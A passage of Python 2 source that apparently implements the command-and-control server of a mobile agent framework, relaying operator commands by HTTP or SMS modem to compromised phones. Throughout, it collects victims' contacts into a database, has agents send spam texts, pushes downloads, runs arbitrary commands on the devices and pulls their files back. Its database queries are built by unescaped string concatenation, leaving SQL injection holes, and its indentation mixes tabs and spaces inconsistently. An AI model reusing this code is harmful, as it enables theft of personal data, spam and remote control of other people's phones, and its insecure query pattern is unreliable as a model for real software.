                    TEXTFILE.close()
                    TEXTFILE2 = open(text, 'w')
                    TEXTFILE2.close()
        
        elif  arsplit[1] == "CONT" :
            deliverymethod = arsplit[2]
            returnmethod   = arsplit[3]
            returnmethod = returnmethod.strip()
            if  returnmethod == "sms" :
                modem = arsplit[4]
                modem = modem.strip()
                
                db = DB(config=config)

                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                command   = key + " " + "CONT" + " " + "SMS"
                if  deliverymethod == "http" :
                    control = webserver + path + "/control"
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command)
                    CONTROLFILE.close()
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]

                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(60)
                        line = usb.read(255)
                        print line
                        values1 = line
			total = ""
			while True:
				new = values1.find('\n', 2)
				print new
				if new ==  -1 :
                                        break
 
                        	subber = substr( values1, 2, 6 )
                        	print subber
                        	get = "+CMTI:"
                        	if  subber == get :

                            		values2 = split( ',', values1 )
                            		offset = values2[1]
					print offset
					usb.write("AT+CMGF=1\r\n")
                        		line = usb.read(255)
                       			print line
                        		sleep(1)
                            		usb.write("AT+CPMS=\"SM\"\r\n")
                            		sleep(1)
                            		line = usb.read(255)
                            		msg  = "AT+CMGR=" + offset + "\r\n"
                            		usb.write(msg)
                            		sleep(2)
                            		line = usb.read(255)
                            		print line
                            		values3 = split( '"', line )
                            		_len = len(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		firstring = ' '.join(values3)
                            		firstring = firstring.strip()
                            		_len = len(firstring)
                            		print _len
                            		print firstring
                            		amount = _len - (8 + 6)
                            		stringtwo = substr( firstring, 8, amount )
                            		print stringtwo
  					total += stringtwo
					send = "AT+CMGD=" + offset + "\r\n"
					usb.write(send)
					line = usb.read(255)
					print line
				values1 = values1[(new + 1):]
				print values1
                        usb.close()
			print total
		        if total != "" : 

                    	    table    = "data"
                            db = DB(config=config)
                            db.query("UPDATE " + table + " SET contacts=" + "'"+ stringtwo + "'"+ " WHERE id=" + "'"+ id + "'")                        

                    
                    elif  modemtype2 == "app" :
                        sleep(60)
                        text = webserver + path2 + "/text.txt"
                        TEXTFILE = open(text, 'r+')
                        line  = TEXTFILE.readline()
                        table = "data"
                        db.query("UPDATE "+table+" SET contacts=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")
                        TEXTFILE.close()
                        TEXTFILE2 = open(text, 'w')
                        TEXTFILE2.write("")
                        TEXTFILE2.close()
                
                if  deliverymethod == "sms" :
                    db.query("SELECT controlkey from modems where id=" + modem)
                    key2        = db.fetchone()[0]
                    db.query("SELECT number from agents where id=" + id)
                    number2     = db.fetchone()[0]
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]

                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write("AT+CMGF=1\r\n")
                        line = usb.read(255)
                        print line
                        sleep(1)
                        numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                        usb.write(numberline)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write( command + struct.pack('b', 26) )
                        sleep(2)
                        line = usb.read(255)
                        print line
                        sleep(60)
                        line = usb.read(255)
                        print line
                        values1 = line
			total = ""
			while True:
				new = values1.find('\n', 2)
				print new
				if new ==  -1 :
                                        break
 
                        	subber = substr( values1, 2, 6 )
                        	print subber
                        	get = "+CMTI:"
                        	if  subber == get :

                            		values2 = split( ',', values1 )
                            		offset = values2[1]
					print offset
                            		usb.write("AT+CPMS=\"SM\"\r\n")
                            		sleep(1)
                            		line = usb.read(255)
                            		msg  = "AT+CMGR=" + offset + "\r\n"
                            		usb.write(msg)
                            		sleep(2)
                            		line = usb.read(255)
                            		print line
                            		values3 = split( '"', line )
                            		_len = len(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		firstring = ' '.join(values3)
                            		firstring = firstring.strip()
                            		_len = len(firstring)
                            		print _len
                            		print firstring
                            		amount = _len - (8 + 6)
                            		stringtwo = substr( firstring, 8, amount )
                            		print stringtwo
  					total += stringtwo
					send = "AT+CMGD=" + offset + "\r\n"
					usb.write(send)
					line = usb.read(255)
					print line
				values1 = values1[(new + 1):]
				print values1
                        usb.close()
			print total
		        if total != "" : 
                            table    = "data"
                            db = DB(config=config)                            
                            db.query("UPDATE "+table+" SET contacts=" + "'"+ stringtwo + "'"+ " WHERE id=" + "'"+ id + "'")
                                            
                    elif  modemtype2 == "app" :
                        command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                        control = webserver + path2 + "/getfunc"
                        CONTROLFILE = open(control, 'w')
                        CONTROLFILE.write(command2)
                        CONTROLFILE.close()
                        sleep(60)
                        text = webserver + path2 + "/text.txt"
                        TEXTFILE = open(text, 'r+')
                        line  = TEXTFILE.readline()
                        table = "data"
                        db.query("UPDATE "+table+" SET contacts=" + "'" + line + "'"+ " WHERE id=" + "'"+ id + "'")
                        TEXTFILE.close()
                        TEXTFILE2 = open(text, 'w')
                        TEXTFILE2.write("")
                        TEXTFILE2.close()                
            
            if  returnmethod == "http" :
                command = key + " " + "CONT" + " " + "WEB"
                if  deliverymethod == "http" :
                    control = webserver + path + "/control"
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command)
                    CONTROLFILE.close()
                    sleep(30)
                    text = webserver + path + "/text.txt"
                    TEXTFILE = open(text, 'r+')
                    line      = TEXTFILE.readline()
                    table     = "data"
                    db = DB(config=config)                    
                    db.query("UPDATE "+table+" SET contacts=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")
                    TEXTFILE.close()
                    TEXTFILE2 = open(text, 'w')
                    TEXTFILE2.write("")
                    TEXTFILE2.close()
                
                if  deliverymethod == "sms" :
                    modem = arsplit[4]
                    modem = modem.strip()
                    db = DB(config=config)
                    
                    db.query("SELECT path from modems where id=" + modem)
                    path2     = db.fetchone()[0]
                    db.query("SELECT controlkey from modems where id=" + modem)
                    key2        = db.fetchone()[0]
                    db.query("SELECT number from agents where id=" + id)
                    number2     = db.fetchone()[0]
                    db.query("SELECT type from modems where id=" + modem)
                    type2       = db.fetchone()[0]

                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write("AT+CMGF=1\r\n")
                        line = usb.read(255)
                        print line
                        sleep(1)
                        numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                        usb.write(numberline)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write( command + struct.pack('b', 26) )
                        sleep(10)
                        line = usb.read(255)
                        print line
                        sleep(60)
                    
                    elif  modemtype2 == "app" :
                        command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                        control = webserver + path2 + "/getfunc"
                        CONTROLFILE = open(control, 'w')
                        CONTROLFILE.write(command2)
                        CONTROLFILE.close()
                        sleep(60)
                        text = webserver + path + "/text.txt"
                        TEXTFILE = open(text, 'r+')
                        line  = TEXTFILE.readline()
                        table = "data"
                        db.query("UPDATE " + table + " SET contacts=" + "'" + line + "'" + " WHERE id=" + "'" + id + "'")
                        TEXTFILE.close()
                        TEXTFILE2 = open(text, 'w')
                        TEXTFILE2.write("")
                        TEXTFILE2.close()

        elif  arsplit[1] == "SPAM" :
	    print "SPAM"
	    modem          = arsplit[2]
            sendnumber     = arsplit[4]
            deliverymethod = arsplit[3]
            splitlength    = len(arsplit)
            end            = splitlength - 1
            sendmessage    = arsplit[5]
            if  end > 5 :
                for i in range(6, end+1):
                    sendmessage += " "
                    sendmessage += arsplit[i]
                
            
            command = key + " " + "SPAM" + " " + sendnumber + " " + sendmessage
            if  deliverymethod == "http" :
                control = webserver + path + "/control"
                CONTROLFILE = open(control, 'w')
                CONTROLFILE.write(command)
                CONTROLFILE.close()
            
            if  deliverymethod == "sms" :
		print "SMS"
                db = DB(config=config)                
                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                db.query("SELECT type from modems where id=" + modem)
                type2     = db.fetchone()[0]
                db.query("SELECT controlkey from modems where id=" + modem)
                key2      = db.fetchone()[0]
                db.query("SELECT number from agents where id=" + id)
                number2     = db.fetchone()[0]
                type2 = type2.strip()

                if  type2 == "app" :
                    control = webserver + path2 + "/getfunc"
		    print control
                    command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command2)
                    CONTROLFILE.close()
                
                if  type2 == "usb" :
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    sleep(1)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    sleep(1)
                    numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write( command + struct.pack('b', 26) )
                    sleep(10)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.close()

        elif  arsplit[1] == "DOWN" :
            modem          = arsplit[2]
            path2          = arsplit[4]
            deliverymethod = arsplit[3]
            filename       = arsplit[5]
            command = key + " " + "DOWN" + " " + path2 + " " + filename + "\n"
            if  deliverymethod == "http" :
                control = webserver + path + "/control"
                CONTROLFILE = open(control, 'w')
                CONTROLFILE.write(command)
                CONTROLFILE.close()
            
            if  deliverymethod == "sms" :
                db = DB(config=config)

                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                db.query("SELECT type from modems where id=" + modem)
                type2     = db.fetchone()[0]
                db.query("SELECT controlkey from modems where id=" + modem)
                key2      = db.fetchone()[0]
                db.query("SELECT number from agents where id=" + id)
                number2     = db.fetchone()[0]
                type2 = type2.strip()

                if  type2 == "app" :
                    control = webserver + path2 + "/getfunc"
                    command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command2)
                    CONTROLFILE.close()
                
                if  type2 == "usb" :
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    sleep(1)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    sleep(1)
                    numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write( command + struct.pack('b', 26) )
                    sleep(10)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.close()

        elif  arsplit[1] == "LIST" :
            modem          = arsplit[4]
            port           = arsplit[5]
            deliverymethod = arsplit[2]
            returnmethod   = arsplit[3]
            port = port.strip()
	    if returnmethod == "sms" :
		returnmethod = "SMS"
	    if returnmethod == "http" :
		returnmethod = "HTTP"
            command = key + " " + "LIST" + " " + port + " " + returnmethod + "\n"
            if  deliverymethod == "http" :
                control = webserver + path + "/control"
                CONTROLFILE = open(control, 'w')
                CONTROLFILE.write(command)
                CONTROLFILE.close()
            
            if  deliverymethod == "sms" :
                db = DB(config=config)

                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                db.query("SELECT type from modems where id=" + modem)
                type2     = db.fetchone()[0]
                db.query("SELECT controlkey from modems where id=" + modem)
                key2      = db.fetchone()[0]
                db.query("SELECT number from agents where id=" + id)
                number2     = db.fetchone()[0]
                type2 = type2.strip()

                if  type2 == "app" :
                    control = webserver + path2 + "/getfunc"
                    command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command2)
                    CONTROLFILE.close()
                
                if  type2 == "usb" :
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    sleep(1)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    sleep(1)
                    numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write( command + struct.pack('b', 26) )
                    sleep(10)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.close()

        elif  arsplit[1] == "EXEC" :
            modem          = arsplit[2]
            deliverymethod = arsplit[3]
            splitlength    = len(arsplit)
            end            = splitlength - 1
            downloaded     = arsplit[4]
            command1       = arsplit[5]
            if  end > 5 :
                for i in range(6,end+1):
                    command1 += " "
                    command1 += arsplit[i]
                
            
            command = key + " " + "EXEC" + " " + downloaded + " " + command1
            if  deliverymethod == "http" :
                control = webserver + path + "/control"
                CONTROLFILE = open(control, 'w')
                CONTROLFILE.write(command)
                CONTROLFILE.close()
            
            if  deliverymethod == "sms" :
                db = DB(config=config)
                
                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                db.query("SELECT type from modems where id=" + modem)
                type2     = db.fetchone()[0]
                db.query("SELECT controlkey from modems where id=" + modem)
                key2      = db.fetchone()[0]
                db.query("SELECT number from agents where id=" + id)
                number2     = db.fetchone()[0]
                type2 = type2.strip()

                if  type2 == "app" :
                    control = webserver + path2 + "/getfunc"
                    command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command2)
                    CONTROLFILE.close()
                
                if  type2 == "usb" :
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    sleep(1)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    sleep(1)
                    numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write( command + struct.pack('b', 26) )
                    sleep(10)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.close()

        elif  arsplit[1] == "PING" :
            deliverymethod = arsplit[2]
            returnmethod   = arsplit[3]
            returnmethod = returnmethod.strip()
            if  returnmethod == "sms" :
                modem = arsplit[4]
                modem = modem.strip()

                db = DB(config=config)                

                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                command   = key + " " + "PING" + " " + returnmethod
                if  deliverymethod == "http" :
                    control = webserver + path + "/control"
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command)
                    CONTROLFILE.close()
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]

                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(180)
                        line = usb.read(255)
                        print line
                        values1 = line
			total = ""
			while True:
				new = values1.find('\n', 2)
				print new
				if new ==  -1 :
                                        break
 
                        	subber = substr( values1, 2, 6 )
                        	print subber
                        	get = "+CMTI:"
                        	if  subber == get :

                            		values2 = split( ',', values1 )
                            		offset = values2[1]
					print offset
                            		usb.write("AT+CPMS=\"SM\"\r\n")
                            		sleep(1)
                            		line = usb.read(255)
                            		msg  = "AT+CMGR=" + offset + "\r\n"
                            		usb.write(msg)
                            		sleep(2)
                            		line = usb.read(255)
                            		print line
                            		values3 = split( '"', line )
                            		_len = len(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		firstring = ' '.join(values3)
                            		firstring = firstring.strip()
                            		_len = len(firstring)
                            		print _len
                            		print firstring
                            		amount = _len - (8 + 6)
                            		stringtwo = substr( firstring, 8, amount )
                            		print stringtwo
  					total += stringtwo
					send = "AT+CMGD=" + offset + "\r\n"
					usb.write(send)
					line = usb.read(255)
					print line
				values1 = values1[(new + 1):]
				print values1
                        usb.close()
			print total
		        if total != "" : 
                            table    = "data"
                            username = config.get('MYSQLUSER')
                            db = DB(config=config)                            
                            db.query("UPDATE "+table+" SET ping=" + "'"+ MySQLdb.escape_string(total) + "'"+ " WHERE id=" + "'"+ id + "'")
                    
                    elif  modemtype2 == "app" :
                        sleep(180)

                        text = webserver + path2 + "/text.txt"
                        TEXTFILE = open(text, 'r+')
                        line  = TEXTFILE.readline()
                        table = "data"
                        db.query("UPDATE "+table+" SET ping=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")
                        TEXTFILE.close()
                        TEXTFILE2 = open(text, 'w')
                        TEXTFILE2.write("")
                        TEXTFILE2.close()

                if  deliverymethod == "sms" :
                    db.query("SELECT controlkey from modems where id=" + modem)
                    key2        = db.fetchone()[0]
                    db.query("SELECT number from agents where id=" + id)
                    number2     = db.fetchone()[0]
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]

                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write("AT+CMGF=1\r\n")
                        line = usb.read(255)
                        print line
                        sleep(1)
                        numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                        usb.write(numberline)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write( command + struct.pack('b', 26) )
                        sleep(2)
                        line = usb.read(255)
                        print line
                        sleep(60)
                        line = usb.read(255)
                        print line
                        values1 = line
			total = ""
			while True:
				new = values1.find('\n', 2)
				print new
				if new ==  -1 :
                                        break
 
                        	subber = substr( values1, 2, 6 )
                        	print subber
                        	get = "+CMTI:"
                        	if  subber == get :

                            		values2 = split( ',', values1 )
                            		offset = values2[1]
					print offset
                            		usb.write("AT+CPMS=\"SM\"\r\n")
                            		sleep(1)
                            		line = usb.read(255)
                            		msg  = "AT+CMGR=" + offset + "\r\n"
                            		usb.write(msg)
                            		sleep(2)
                            		line = usb.read(255)
                            		print line
                            		values3 = split( '"', line )
                            		_len = len(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		shift(values3)
                            		firstring = ' '.join(values3)
                            		firstring = firstring.strip()
                            		_len = len(firstring)
                            		print _len
                            		print firstring
                            		amount = _len - (8 + 6)
                            		stringtwo = substr( firstring, 8, amount )
                            		print stringtwo
  					total += stringtwo
					send = "AT+CMGD=" + offset + "\r\n"
					usb.write(send)
					line = usb.read(255)
					print line
				values1 = values1[(new + 1):]
				print values1
                        usb.close()
			print total
		        if total != "" : 
                            table    = "data"

                            db = DB(config=config)
                            db.query("UPDATE " + table + " SET ping=" + "'"+ MySQLdb.escape_string(total) + "'"+ " WHERE id=" + "'"+ id + "'")
                    
                    elif  modemtype2 == "app" :
                        command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                        control = webserver + path2 + "/getfunc"
                        CONTROLFILE = open(control, 'w')
                        CONTROLFILE.write(command2)
                        CONTROLFILE.close()
                        sleep(180)
                        text = webserver + path2 + "/text.txt"
                        TEXTFILE = open(text, 'r+')
                        line     = TEXTFILE.readline()
                        table    = "data"

                        db = DB(config=config)
                        
                        db.query("UPDATE "+table+" SET ping=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")
                        TEXTFILE.close()
                        TEXTFILE2 = open(text, 'w')
                        TEXTFILE2.write("")
                        TEXTFILE2.close()

            if  returnmethod == "http" :
                command = key + " " + "PING" + " " + "WEB"
                if  deliverymethod == "http" :
                    control = webserver + path + "/control"
                    CONTROLFILE = open(control, 'w')
                    CONTROLFILE.write(command)
                    CONTROLFILE.close()
                    sleep(180)
                    text = webserver + path + "/text.txt"
                    TEXTFILE = open(text, 'r+')
                    line     = TEXTFILE.readline()
                    table    = "data"

                    db = DB(config=config)                    

                    db.query("UPDATE "+table+" SET ping=" + "'"+ line + "'"+ " WHERE id=" + "'"+ id + "'")

                    TEXTFILE.close()
                    TEXTFILE2 = open(text, 'w')
                    TEXTFILE2.write("")
                    TEXTFILE2.close()
                
                if  deliverymethod == "sms" :
                    modem = arsplit[4]
                    modem = modem.strip()
                    
                    db.query("SELECT path from modems where id=" + modem)
                    path2     = db.fetchone()[0]
                    db.query("SELECT controlkey from modems where id=" + modem)
                    key2        = db.fetchone()[0]
                    db.query("SELECT number from agents where id=" + id)
                    number2     = db.fetchone()[0]
                    db.query("SELECT type from modems where id=" + modem)
                    modemtype2 = db.fetchone()[0]

                    if  modemtype2 == "usb" :
                        usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                        usb.write("ATZ\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write("AT+CMGF=1\r\n")
                        sleep(1)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                        usb.write(numberline)
                        line = usb.read(255)
                        print line
                        sleep(1)
                        usb.write( command + struct.pack('b', 26) )
                        sleep(10)
                        line = usb.read(255)
                        print line
                        sleep(60)
                    
                    elif  modemtype2 == "app" :

                        command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                        control = webserver + path2 + "/getfunc"
                        CONTROLFILE = open(control, 'w')
                        CONTROLFILE.write(command2)
                        CONTROLFILE.close()
                        sleep(60)
                    
                    text = webserver + path + "/text.txt"
                    TEXTFILE = open(text, 'r+')
                    line  = TEXTFILE.readline()
                    table = "data"
                    db.query("UPDATE "+table+" SET ping=" + "'" + line + "'" + " WHERE id=" + "'" + id + "'")
                    TEXTFILE.close()
                    TEXTFILE2 = open(text, 'w')
                    TEXTFILE2.write("")
                    TEXTFILE2.close()

        elif  arsplit[1] == "UPLD" :
            delivery = arsplit[2]
            filename = arsplit[3]
            delivery = delivery.strip()
            command = key + " " + "UPLD " + filename
            if  delivery == "http" :
                control = webserver + path + "/control"
                CONTROLFILE = open(control, 'w')
                CONTROLFILE.write(command)
                CONTROLFILE.close()
                sleep(30)
                textfile = webserver + path + "/text.txt"
                TEXT = open(textfile, 'r+')
                if  ( os.path.getsize(textfile) != 0 ) :
                    command = "cp" + " " + textfile + " " + "."
                    system(command)
                    textdir   = os.getcwd()
                    table     = "data"
                    text      = textdir + "/" + "text.txt"
                    db = DB(config=config)
                    db.query("UPDATE " + table + " SET file=" + "'"+ text + "'"+ " WHERE id=" + "'"+ id + "'")

                    TEXT.close()
                    TEXT2 = open(textfile, 'w')
                    TEXT2.close()

            if  delivery == "sms" :
                modem = arsplit[4]
                modem = modem.strip()

                db = DB(config=config) 

                db.query("SELECT path from modems where id=" + modem)
                path2     = db.fetchone()[0]
                db.query("SELECT controlkey from modems where id=" + modem)
                key2      = db.fetchone()[0]
                db.query("SELECT number from agents where id=" + id)
                number2        = db.fetchone()[0]
                db.query("SELECT type from modems where id=" + modem)
                modemtype2     = db.fetchone()[0]

                if  modemtype2 == "usb" :
                    usb = serial.Serial('/dev/ttyUSB1', 115200, timeout=2)
                    usb.write("ATZ\r\n")
                    sleep(1)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write("AT+CMGF=1\r\n")
                    line = usb.read(255)
                    print line
                    sleep(1)
                    numberline = "AT+CMGS=\"" + number2 + "\"\r\n"
                    usb.write(numberline)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.write( command + struct.pack('b', 26) )
                    sleep(2)
                    line = usb.read(255)
                    print line
                    sleep(1)
                    usb.close()

                
                elif  modemtype2 == "app" :
                    control = webserver + path2 + "/getfunc"
                    CONTROLFILE = open(control, 'w')
                    command2 = key2 + " " + "SEND" + " " + number2 + " " + command
                    CONTROLFILE.write(command2)
                    CONTROLFILE.close()
                
                sleep(60)
                textfile = webserver + path + "/text.txt"
                TEXT = open(textfile, 'r+')
                if  ( os.path.getsize(textfile) != 0) :
                    command = "cp" + " " + textfile + " " + "."
                    system(command)
                    textdir = os.getcwd()
                    table   = "data"
                    text    = textdir + "/" + "text.txt"
                    db.query("UPDATE "+table+" SET file=" + "'" + text + "'" + " WHERE id=" + "'" + id + "'")
                    TEXT.close()
                    TEXT2 = open(textfile, 'w')
                    TEXT2.close()
